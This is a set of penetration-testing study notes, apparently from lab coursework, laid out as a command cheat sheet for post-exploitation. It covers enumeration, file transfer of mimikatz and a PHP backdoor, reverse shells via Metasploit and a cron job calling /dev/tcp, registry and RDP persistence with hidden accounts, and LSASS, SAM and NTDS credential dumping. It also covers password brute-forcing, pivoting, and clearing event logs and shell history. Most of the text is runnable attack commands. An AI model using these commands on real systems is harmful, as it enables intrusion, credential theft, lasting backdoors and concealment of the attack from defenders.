	    	Automating Local Enumeration
	2. Transferring files
		Setting up a web server with Python
	    	Transferring files to windows targets
	    	Transferring files to linux targets
	3. Upgrading shells
		Upgrading command shells to meterpreter
	    	Spawning tty shells
	4. Privilege escalation
		Identifying PrivEsc Vulns
	    	Windows PrivEsc
	    	Linux PrivEsc
	5. Persistence
	    	Setting Up Persistence On Windows
	    	Setting Up Persistence On Linux
	6. Dumping & Cracking hashes
	    	Dumping & Cracking Windows Hashes
	    	Dumping & Cracking Linux Hashes
	7. Pivoting
	    	Internal Network Recon
	    	Pivoting
	8. Clearing tracks
	    	Clearing your tracks on Windows & Linux

* Windows Enumeration
    Windows Local Enumeration
      Enumerating System information
        We are looking for:
          - Hostname
          - OS Name(Windows 7,8,etc)
          - OS Build & Service Pack (Windows 7 SP1 7600)
          - OS Architecture (x64/x86)
          - Installed updates/Hotfixes
        meterpreter >
          getuid //Current user
          sysinfo
        shell >
          hostname
          systeminfo
          wmic qfe get Caption,Description,HotFixID,InstalledOn //Security Update
          cat C:\Windows\System32\eula.txt

      Enumerating Users & Groups
        We are looking for:
          - Current user & privileges
          - Additional user information
          - Other users on the system
          - Groups
          - Members of the built-in administrator group
        //The windows Administrator account is disabled by default unless it is explicitly enabled.
        meterpreter >
          getuid
          getprivs
          search logged_on //Enumerate current and recently logged users
        shell >
          whoami
          whoami /priv
          query user //Seet what users are logged on in addition to you
          net users
          net user administrator //Know more about a user
          net localgroup
          net localgroup administrators //Know the members of this group
      Enumerating Network Information
        We are looking for:
          - Current IP address & network adapter
          - Internal networks
          - TCP/UDP services running and their respective ports
          - Other hosts on the network
          - Routing table
          - Windows Firewall state
        shell > 
          ipconfig /all
          route print
          arp -a
          netstat -ano
          netsh firewall show state or netsh advfirewall firewall 
          netsh advfirewall show allprofiles
      Enumerating Processes & Services
        We are looking for:
          - Running processes & services
          - Scheduled tasks
        > A process is an instance of a running executable(.exe) or program
        > A service is a process which runs in the background and does not interact with the desktop
        meterpreter >
          ps 
          pgrep explorer.exe
          migrate 2176 //You can only migrate to a different process if you have an elevated session on the target system
        shell >
          net start //Services running in the background
          wmic service list brief
          tasklist /svc //List services running under that particular process
          schtasks /query /fo list /v
      
      Automating Windows Local Enumeration
        https://github.com/411Hall/JAWS //It should run on every Windows version since Windows 7
        meterpreter > 
          show_mount
        search win_privs
        search enum_logged_on_users 
        search checkvm
        search enum_applications //Applications installed
        search enum_computers //Is the host part of a domain
        search enum_patches //Patches installed
        search enum_shares
        powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
    Linux Local enumeration
      Enumerating system information
        We are looking for: 
          - Hostname
          - Distribution & distribution release version
          - Kernel version & architecture
          - CPU information
          - Disk information & mounted drives
          - Installed packages/software
        bash > 
          hostname
          cat /etc/issue
          cat /etc/*release
          uname -a
          env //Enviromental variables
          lscpu
          free -h //Hos many RAM is consumed
          df -h
          df -ht ext4 
          lsblk | grep sd //Storage devices
          dpkg -l
    Enumerating users & groups
      groups
      groups bob
      cat /etc/passwd 
      useradd -m bob -s /bin/bash 
      usermod -aG root bob //To which group and who user?
      w or who 
      last //by ssh or console
      lastlog  //List of users of have recently logged in to the system
    Enumerating Network Information
      We are looking for:   
        - Current IP address & network adapter
        - Internal networks
        - TCP/UDP services running and their respective ports
        - Other hosts on the network
      meterpreter >
        ifconfig
        netstat 
        route
        arp
      shell > 
        ip a 
        cat /etc/networks //List of interfaces 
        cat /etc/hostname
        cat /etc/hosts
        cat /etc/resolv.conf //DNS server by default
        arp -a
    Enumerating processes & cron jobs
      We are looking for:
        - Running services
        - Cron jobs
      msfconsole >
        ps
      shell >
        ps
        ps aux
        top
        crontab -l
        ls -la /etc/cron* //Display all cron jobs
    Automating Linux Local Enumeration
      search enum_configs
      search enum_network
      search enum_system
      search checkvm
      https://github.com/rebootuser/LinEnum

Transferring files to Windows & Linux targets
* Using python server
	Setting up a web server with Python
	    Python2 ==> SimpleHTTPServer
	    Python3 ==> http.server
	Transferring files to windows targets
  	  certutil -urlcache -f http://10.10.4.2/mimikatz.exe mimikatz.exe
  	Transferring files to Linux targets
  	  cd /tmp
  	  cd /usr/share/webshells/php/
  	  python3 -m http.server 80
  	  wget http://10.10.3.4/php-backdoor.php
    		If the remote server does not have wget, we can use cURL to download the file:
			curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
* Using scp
	Granted we have obtained ssh user credentials on the remote host.
		scp linenum.sh user@remotehost:/tmp/linenum.sh
* Using base64
	Maybe, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:
		base64 shell -w 0
	Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file
		echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
	Finally, we can use md5sum to ensure that the file not mess up
	

Shells
  Upgrading non-interactive shells (Linux post exploitation)
    //Which shells the system has?
      cat /etc/shells
    Is python installed?
      python --version
      python -c 'import pty; pty.spawn("/bin/bash")'
    Is perl installed?
      perl -e 'exec "/bin/bash";'
      perl: exec "/bin/bash";
    Is ruby installed?
      ruby: exec "/bin/bash"
  Now, check the environmental variables
    env
    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    export TERM=xterm
    export SHELL=bash

Escalation
  Windows privilege escalation
    Identifying windows privilege escalation vulnerabilities
      https://github.com/itm4n/PrivescCheck
      use exploit/multi/script/web_delivery
        set target PSH\ (Binary)
        set payload windows/shell/reverse_tcp
        set PSH-EncodedCommand false
      //Upgrade normal shell to meterpreter
        set WIN_TRANSFER VBS
      //Once we have access we can use PrivescCheck
          powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
          runas.exe /user:administrator cmd
      //In our machine
        //This module hosts an HTML Application (HTA) that when opened will run a payload via
Powershell
        use exploit/windows/misc/hta_server
      //In victim
        mshta.exe http://10.10.15.2:8080/jxEyD3w.hta

    Windows Privilege escalation
      //Supose that we have obtained valid credentials. After obtaining user account credentials, what protocols can we use to authenticate with the Windows target 
      //Without Metasploit
        psexec.py administrator@10.10.5.10 
      //With Metasploit
        use exploit/windows/smb/psexec
          set smbuser 
          set smbpass
            
Linux Privilege Escalation
	> PrivEsc Checklists
		https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
		https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
	> Enumeration Scripts
		https://github.com/rebootuser/LinEnum.git
		https://github.com/sleventyeleven/linuxprivchecker
		https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
		
  Weak Permissions
    cat /etc/passwd
    cat /etc/groups 
    groups student
    find / -not -type l -perm -o+w
    // /etc/shadow is writable
      openssl passwd -1 -salt abc password //-1 is the lower level of hash
      vim /etc/shadow
  SUDO privileges
    sudo -l
        
Persistence
    Windows Persistence
        Persistence Via Services
            msfconsole -q 
                ps -S explorer.exe
                migrate 3124
                search persistence_service
                use multi/handler
                    set payload windows/meterpreter/reverse_tcp
        Persistence via RDP
            meterpreter >
                run getgui -e -u m1l0js -p m1l0js_123321
                //getgui command makes the below changes to the target machine
                ● Enable RDP service if it’s disabled
                ● Creates new user for an attacker
                ● Hide user from Windows Login screen
                ● Adding created user to "Remote Desktop Users" and "Administrators" groups
            //Now we can access via RDP
            xfreerdp /u:m1l0js /p:m1l0js_123321 /v:10.2.18.93
            //Think as a red teamer and create a user like guest instead of the normal Guest

    Linux persistence
        Persistence via SSH Keys
            //In most cases Linux servers will have key-based authentication enabled for the SSH service, allowing users to access the Linux system remotely without the need for a password
            // After gaining access to a Linux system, we can transfer the SSH private key of a specific user account to our system and use that SSH private key for all future authentication and access
            scp student@192.63.238.3:~/.ssh/id_rsa .
            chmod 400 id_rsa
            ssh -i id_rsa student@192.63.238.3
          Create a ssh key pair
            ssh-keygen -v 4096
            //Pass your id_rsa.pub
              ssh-copy-id root@10.10.13.4
            //At this moment, authorized keys exists
        Persistence via Cron Jobs
          Cron jobs = schedule tasks(Windows)
          * * * * * command to execute
          min(0-59)
          hour(0-23)
          day of month(1-31)
          month(1-12)
          day of week(0-7)
          //Example
            echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/1234 0>&1'" > cron
            crontab -l  //List cron jobs
            crontab -i cron //Include our cron job
          //Other example
            echo " * * * * * cd /home/student/ && python3 -m http.server 8000" > cron
            crontab -i cron
            crontab -l

Dumping & Cracking 
  Dumping & cracking NTLM hashes(Windows)
    meterpreter >
      pgrep lsass 
      migrate 708
      hashdump //List NTLM hashes
    //Crack it with meterpreter
      use auxiliary/analyze/crack_windows
    //Crack it with John
      john --list=formats
      john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
    //Crack it with hashcat
      hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
    
  Dumping & cracking Linux password hashes
    use exploit/unix/ftp/proftpd_133c_backdoor
    use post/linux/gather/hashdump
    //Crack it with john
      john --format=sha512crypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
      john --show
    //Crack it with hashcat
      hashcat --help | grep 1800
      hashcat -a 3 -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt

Pivoting
  meterpreter > 
    run autoroute -s 10.0.29.0/20 
    run autoroute -p //List active routing table
  use auxiliary/scanner/portscan/tcp
  meterpreter >
    portfwd add -l 1234 -p 80 -r 10.0.29.96
  use badblue_passthru 
    set payload windows/meterpreter/bind_tcp


Clearing your tracks
  Windows
    use exploit/windows/local/persistence_service 
      resource ....rc //It will clear the traces and the .exe generated with this module
    meterpreter > 
      clearev

  Linux
    history -c 
    cat /dev/null  > bash_history
###Persistence
* What if we have to be persistent?
	[+] Using netcat
		We need to modify the regedit
      			1. Go to Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
      		  	2. New ==> String ==> Type the name of the netcat file (for example winconfig)
      		  	3. Edit string ==> Value data ==> "C:\Windows\System32\winconfig.exe 192.168.0.10 4126 -e cmd.exe"

	[+] Using Metasploit
  		use exploit/windows/local/s4u_persistence
  	  	show options
  	  	sessions
  	  	set session 2
  	  	set trigger logon
  	  	set payload windows/meterpreter/reverse_tcp
  	  	set lhost 192.168.0.10
  	  	set lport 4126
  	  	show options
  	  	exploit
###Lateral Movement 
* How to pivot into networks?
	[+] Using Metasploit
		Add a route
			run autoroute -h
      			2 different ways 
      				> run autoroute -s 192.222.74.0/24 or run autoroute  -s 192.222.74.0 -n 255.255.255.0
      			  	> route add 192.222.74.0 255.255.255.0 1(meterpreter session ID)
      			background
      			route print

    		use exploit/multi/handler
    		set paload windows/meterpreter/reverse_tcp
    		show options
    		set lport 4126
    		screenshot
    		download personal_information.txt /root/Desktop
    		upload ..
    		sysinfo
    		ps

###Password attacks
## Connecting to Target

| **Command**| **Description**|
|-|-|
| `xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!` | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol. |
| `evil-winrm -i <ip> -u user -p password`            | Uses Evil-WinRM to establish a Powershell session with a target. |
| `ssh user@<ip>`                                     | Uses SSH to connect to a target using a specified user.      |
| `smbclient -U user \\\\<ip>\\SHARENAME`             | Uses smbclient to connect to an SMB share using a specified user. |
| `python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/` | Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host. |

---
## Password Mutations

| **Command**| **Description**|
|-|-|
| `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist` | Uses cewl to generate a wordlist based on keywords present on a website. |
| `hashcat --force password.list -r custom.rule --stdout > mut_password.list` | Uses Hashcat to generate a rule-based word list.             |
| `./username-anarchy -i /path/to/listoffirstandlastnames.txt` | Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username. |
| `curl -s https://fileinfo.com/filetypes/compressed \| html2text \| awk '{print tolower($1)}' \| grep "\." \| tee -a compressed_ext.txt` | Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords. |

---
## Remote Password Attacks

| **Command**| **Description**|
|-|-|
| `crackmapexec winrm <ip> -u user.list -p password.list` | Uses CrackMapExec over WinRM to attempt to brute force user names and passwords specified hosted on a target. |
| `crackmapexec smb <ip> -u "user" -p "password" --shares` | Uses CrackMapExec to enumerate smb shares on a target using a specified set of credentials. |
| `hydra -L user.list -P password.list <service>://<ip>`       | Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service. |
| `hydra -l username -P password.list <service>://<ip>`       | Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service. |
| `hydra -l user.list -p password <service>://<ip>`       | Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service. |
| `hydra -C <user_pass.list> ssh://<IP>`                       | Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack. |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam` | Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network. |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa` | Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way. |
| `crackmapexec smb <ip> -u <username> -p <password> --ntds` | Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network. |
| `evil-winrm -i <ip>  -u  Administrator -H "<passwordhash>"` | Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of `Pass-The-Hash` attack. |

---
## Windows Local Password Attacks


| **Command**| **Description**|
|-|-|
| `tasklist /svc`                                              | A command-line-based utility in Windows used to list running processes. |
| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml` | Uses Windows command-line based utility findstr to search for the string "password" in many different file type. |
| `Get-Process lsass`                                          | A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line. |
| `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full` | Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials. |
| `pypykatz lsa minidump /path/to/lsassdumpfile`               | Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file. |
| `reg.exe save hklm\sam C:\sam.save`                          | Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system). |
| `move sam.save \\<ip>\NameofFileShare`                  | Uses move in Windows to transfer a file to a specified file share over the network. |
| `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL` | Uses Secretsdump.py to dump password hashes from the SAM database. |
| `vssadmin CREATE SHADOW /For=C:`                             | Uses Windows command line based tool vssadmin to create a volume shadow copy for `C:`. This can be used to make a copy of NTDS.dit safely. |
| `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit` | Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of `C:`. |


----
## Linux Local Password Attacks

| **Command**| **Description**|
|-|-|
| `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done` | Script that can be used to find .conf, .config and .cnf files on a Linux system. |
| `for i in $(find / -name *.cnf 2>/dev/null \| grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null \| grep -v "\#";done` | Script that can be used to find credentials in specified file types. |
| `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share\|man";done` | Script that can be used to find common database files.       |
| `find /home/* -type f -name "*.txt" -o ! -name "*.*"`        | Uses Linux-based find command to search for text files.      |
| `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share";done` | Script that can be used to search for common file types used with scripts. |
| `for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done` | Script used to look for common types of documents.           |
| `cat /etc/crontab`                                           | Uses Linux-based cat command to view the contents of crontab in search for credentials. |
| `ls -la /etc/cron.*/`                                        | Uses Linux-based  ls -la command to list all files that start with `cron` contained in the etc directory. |
| `grep -rnw "PRIVATE KEY" /* 2>/dev/null \| grep ":1"`        | Uses Linux-based command grep to search the file system for key terms `PRIVATE KEY` to discover SSH keys. |
| `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null \| grep ":1"`    | Uses Linux-based grep command to search for the keywords `PRIVATE KEY` within files contained in a user's home directory. |
| `grep -rnw "ssh-rsa" /home/* 2>/dev/null \| grep ":1"`        | Uses Linux-based grep command to search for keywords `ssh-rsa` within files contained in a user's home directory. |
| `tail -n5 /home/*/.bash*`                                   | Uses Linux-based tail command to search the through bash history files and output the last 5 lines. |
| `python3 mimipenguin.py`                                     | Runs Mimipenguin.py using python3.                           |
| `bash mimipenguin.sh`                                       | Runs Mimipenguin.sh using bash.                              |
| `python2.7 lazagne.py all`                                   | Runs Lazagne.py with all modules using python2.7             |
| `ls -l .mozilla/firefox/ \| grep default `                    | Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword `default` using grep. |
| `cat .mozilla/firefox/1bplpd86.default-release/logins.json \| jq .` | Uses Linux-based command cat to search for credentials stored by Firefox in JSON. |
| `python3.9 firefox_decrypt.py`                               | Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9. |
| `python3 lazagne.py browsers`                                | Runs Lazagne.py browsers module using Python 3.               |

----
## Cracking Passwords

| **Command**| **Description**|
|-|-|
| `hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt` | Uses Hashcat to crack NTLM hashes using a specified wordlist. |
| `hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show` | Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output. |
| `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes` | Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking. |
| `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked` | Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked. |
| ` hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`           | Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file. |
| `hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked` | Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked. |
| `ssh2john.pl SSH.private > ssh.hash`         | Runs Ssh2john.pl script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash. |
| `john ssh.hash --show`                                       | Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal. |
| `office2john.py Protected.docx > protected-docx.hash`        | Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash. |
| `john --wordlist=rockyou.txt protected-docx.hash`            | Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash. |
| `pdf2john.pl PDF.pdf > pdf.hash`                       | Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked. |
| `john --wordlist=rockyou.txt pdf.hash`                       | Runs John in conjunction with a wordlist to crack a pdf hash. |
| `zip2john ZIP.zip > zip.hash`                                | Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash. |
| `john --wordlist=rockyou.txt zip.hash`                       | Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash. |
| `bitlocker2john -i Backup.vhd > backup.hashes`               | Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes. |
| `file GZIP.gzip`                                             | Uses the Linux-based file tool to gather file format information. |
| `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null \| tar xz;done` | Script that runs a for-loop to extract files from an archive. |
https://tldp.org/HOWTO/pdf/User-Authentication-HOWTO.pdf
* When you log into your computer, you type your username and password. The operating system takes the password, hashes it and then tries to match the result against the saved hash in the password database. If the two values match, you log in successfully. The operating system does not need to know the clear-text password.

* John the Ripper 
	[+] List of accepted formats
		john --list=formats
    	[+] To perform a pure brute force attack over a users list:
            > Incremental Mode is an advanced John mode used to crack passwords using a character set. It is a hybrid attack, which means it will attempt to match the password by trying all possible combinations of characters from the character set. This mode is the most effective yet most time-consuming of all the John modes. This mode works best when we know what the password might be, as it will try all the possible combinations in sequence, starting from the shortest one. This makes it much faster than the brute force attack, where all combinations are tried randomly. Moreover, the incremental mode can also be used to crack weak passwords, which may be challenging to crack using the standard John modes. The main difference between incremental mode and wordlist mode is the source of the password guesses. Incremental mode generates the guesses on the fly, while wordlist mode uses a predefined list of words. At the same time, the single crack mode is used to check a single password against a hash.
            > Using this command we will read the hashes in the specified hash file and then generate all possible combinations of characters, starting with a single character and incrementing with each iteration. It is important to note that this mode is highly resource intensive and can take a long time to complete, depending on the complexity of the passwords, machine configuration, and the number of characters set. Additionally, it is important to note that the default character set is limited to a-zA-Z0-9. Therefore, if we attempt to crack complex passwords with special characters, we need to use a custom character set.
    		john --incremental --users:<users list> <file to crack>
    		john --wordlist=rockyou.txt --rules --users=victim1,victim2 hash //Other way
    	[+] Using single crack mode
    		john --single --format=[format] [path to file]
    	[+] To display the password recovered:  
    		john --show crackme
    	[+] Default file where the cracked passwords are stored by John
    		/root/.john/john.pot
    	[+] It is a good idea if we are in Linux to check the 
    		/etc/login.defs to see the hash algorithm used to hash the password present in the shadow file
    	[+] Cool features
		/usr/share/john/office2john.py when .docx documents
        pdf2john server_doc.pdf > server_doc.hash
        m1l0js@htb[/htb]$ locate *2john*
        Tool	                Description
        pdf2john	            Converts PDF documents for John
        ssh2john	            Converts SSH private keys for John
        mscash2john	            Converts MS Cash hashes for John
        keychain2john	        Converts OS X keychain files for John
        rar2john	            Converts RAR archives for John
        pfx2john	            Converts PKCS#12 files for John
        truecrypt_volume2john	Converts TrueCrypt volumes for John
        keepass2john	        Converts KeePass databases for John
        vncpcap2john	        Converts VNC PCAP files for John
        putty2john	            Converts PuTTY private keys for John
        zip2john	            Converts ZIP archives for John
        hccap2john	            Converts WPA/WPA2 handshake captures for John
        office2john	            Converts MS Office documents for John
        wpa2john	            Converts WPA/WPA2 handshakes for John
    	[+] Unshadowing
    		unshadow - Invokes the unshadow tool
    	  	unshadow [path to passwd] [path to shadow] > crackme.txt
    	  	[path to passwd] - The file that contains the copy of the /etc/passwd file you've taken from the target machine
    	  	[path to shadow] - The file that contains the copy of the /etc/shadow file you've taken from the target machine 
    	
* Rainbow table
	[+] It is a table containing links between the results of a run of one hashing function and another.
	[+] For Windows ==> ophcrack.

* Hashcat 
	[+] Relies in GPU instead of CPU
	[+] List of accepted formats
		hashcat --example-hashes

	[+] First steps
    		hashcat -b //First step
    		hashcat -m 0 -a 0 -D2 example.hash example.dict

	[+] Rules file
    		--rules-file ==> check it in hashcat page
  	[+] URLs
  		https://wiki.skullsecurity.org/index.php/Passwords //Other 

* Remote passwords attacks
    + Network Services
        & WinRM

            > Windows Remote Management (WinRM ==> https://docs.microsoft.com/en-us/windows/win32/winrm/portal) is the Microsoft implementation of the network protocol Web Services Management Protocol (WS-Management ==> https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol). It is a network protocol based on XML web services using the Simple Object Access Protocol (SOAP ==> https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) used for remote management of Windows systems. It takes care of the communication between Web-Based Enterprise Management (WBEM ==> https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management) and the Windows Management Instrumentation (WMI), which can call the Distributed Component Object Model (DCOM ==> https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0).
            > However, for security reasons, WinRM must be activated and configured manually in Windows 10. Therefore, it depends heavily on the environment security in a domain or local network where we want to use WinRM. In most cases, one uses certificates or only specific authentication mechanisms to increase its security. WinRM uses the TCP ports 5985 (HTTP) and 5986 (HTTPS).
            > A handy tool that we can use for our password attacks is CrackMapExec, which can also be used for other protocols such as SMB, LDAP, MSSQL, and others. We recommend reading the official documentation(https://mpgn.gitbook.io/crackmapexec/) for this tool to become familiar with 

            m1l0js@htb[/htb]$ c10.129.202.222rackmapexec winrm 10.129.42.197 -u user.list -p password.list

            > The appearance of (Pwn3d!) is the sign that we can most likely execute system commands if we log in with the brute-forced user. Another handy tool that we can use to communicate with the WinRM service is Evil-WinRM, which allows us to communicate with the WinRM service efficiently.

            m1l0js@htb[/htb]$ sudo gem install evil-winrm
            m1l0js@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

            > If the login was successful, a terminal session is initialized using the Powershell Remoting Protocol (MS-PSRP ==> https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec), which simplifies the operation and execution of commands.

        & SSH
            > Secure Shell (SSH) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on TCP port 22 by default, to which we can connect using an SSH client. This service uses three different cryptography operations/methods: symmetric encryption, asymmetric encryption, and hashing.
            > Symmetric Encryption
                Symmetric encryption uses the same key for encryption and decryption. However, anyone who has access to the key could also access the transmitted data. Therefore, a key exchange procedure is needed for secure symmetric encryption. The Diffie-Hellman key exchange method is used for this purpose. If a third party obtains the key, it cannot decrypt the messages because the key exchange method is unknown. However, this is used by the server and client to determine the secret key needed to access the data. Many different variants of the symmetrical cipher system can be used, such as AES, Blowfish, 3DES, etc.
            > Asymmetrical Encryption
                Asymmetric encryption uses two SSH keys: a private key and a public key. The private key must remain secret because only it can decrypt the messages that have been encrypted with the public key. If an attacker obtains the private key, which is often not password protected, he will be able to log in to the system without credentials. Once a connection is established, the server uses the public key for initialization and authentication. If the client can decrypt the message, it has the private key, and the SSH session can begin.
            > Hashing
                The hashing method converts the transmitted data into another unique value. SSH uses hashing to confirm the authenticity of messages. This is a mathematical algorithm that only works in one direction.

            m1l0js@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197

        & RDP
            > Microsoft's Remote Desktop Protocol (RDP) is a network protocol that allows remote access to Windows systems via TCP port 3389 by default. RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization. The Remote Desktop Protocol defines two participants for a connection: a so-called terminal server, on which the actual work takes place, and a terminal client, via which the terminal server is remotely controlled. In addition to the exchange of image, sound, keyboard, and pointing device, the RDP can also print documents of the terminal server on a printer connected to the terminal client or allow access to storage media available there. Technically, the RDP is an application layer protocol in the IP stack and can use TCP and UDP for data transmission. The protocol is used by various official Microsoft apps, but it is also used in some third-party solutions.
                m1l0js@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197

        & SMB
            > Server Message Block (SMB) is a protocol responsible for transferring data between a client and a server in local area networks. It is used to implement file and directory sharing and printing services in Windows networks. SMB is often referred to as a file system, but it is not. SMB can be compared to NFS for Unix and Linux for providing drives on local networks.

            > SMB is also known as Common Internet File System (CIFS). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS. In addition, we will often encounter Samba, which is an open-source implementation of the above functions. For SMB, we can also use hydra again to try different usernames in combination with different passwords.
                m1l0js@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
            > This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile hydra or use another very powerful tool, the Metasploit framework.
                msfconsole -q 10.129.202.136
                msf6 > use auxiliary/scanner/smb/smb_login
  
            m1l0js@htb[/htb]$ crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
            m1l0js@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME

[+] Password Mutations
    > The complete list of this syntax can be found in the official documentation of Hashcat. However, the ones listed below are enough for us to understand how Hashcat mutates words.
    Function	Description
    :	        Do nothing.
    l	        Lowercase all letters.
    u	        Uppercase all letters.
    c	        Capitalize the first letter and lowercase others.
    sXY	        Replace all instances of X with Y.
    $!	        Add the exclamation character at the end.

    > Generating rule-based wordlist
        m1l0js@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

    > Hashcat and John come with pre-built rule lists that we can use for our password generating and cracking purposes. One of the most used rules is best64.rule, which can often lead to good results. It is important to note that password cracking and the creation of custom wordlists is a guessing game in most cases. We can narrow this down and perform more targeted guessing if we have information about the password policy and take into account the company name, geographical region, industry, and other topics/words that users may select from to create their passwords. Exceptions are, of course, cases where passwords are leaked and found.
        m1l0js@htb[/htb]$ ls /usr/share/hashcat/rules/
    > We can now use another tool called CeWL to scan potential words from the company's website and save them in a separate list. We can then combine this list with the desired rules and create a customized password list that has a higher probability of guessing a correct password. We specify some parameters, like the depth to spider (-d), the minimum length of the word (-m), the storage of the found words in lowercase (--lowercase), as well as the file where we want to store the results (-w).
